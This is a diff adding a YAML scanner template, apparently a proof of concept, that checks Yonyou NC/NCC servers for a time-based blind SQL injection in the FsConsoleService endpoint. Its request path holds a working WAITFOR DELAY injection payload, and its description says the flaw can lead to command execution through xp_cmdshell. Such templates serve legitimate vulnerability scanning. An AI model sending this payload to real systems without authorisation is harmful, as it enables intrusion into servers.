@@ -1,0 +1,20 @@
+name: poc-yaml-yonyou-nc-fsconsoleservice-sqli
+set:
+  sleep_time: 4
+rules:
+  - method: GET
+    path: "/servlet/~uapbs/uap.pub.fs.console.FsConsoleService?confData=guid%3d233%27;WAITFOR+DELAY+%270:0:{{sleep_time}}%27--+&operType=filterLog"
+    follow_redirects: false
+    expression: >
+      response.status == 200 && response.duration >= sleep_time
+detail:
+  author: L4xy
+  description: |
+    用友NC/NCC文件服务器配置管理FsConsoleService接口存在SQL注入漏洞。
+    攻击者通过构造恶意的confData参数，可触发时间盲注（WAITFOR DELAY），
+    配合数据库xp_cmdshell可执行任意命令，从而控制服务器。
+    影响版本：用友NC633/NC65/NCC1811/NCC1903/NCC1909/NCC2005
+  links:
+    - https://blog.csdn.net/misu6/article/details/146295382
+    - https://cn-sec.com/archives/4221065.html
+  tags: sqli,yonyou,nc,ncc,fsconsoleservice
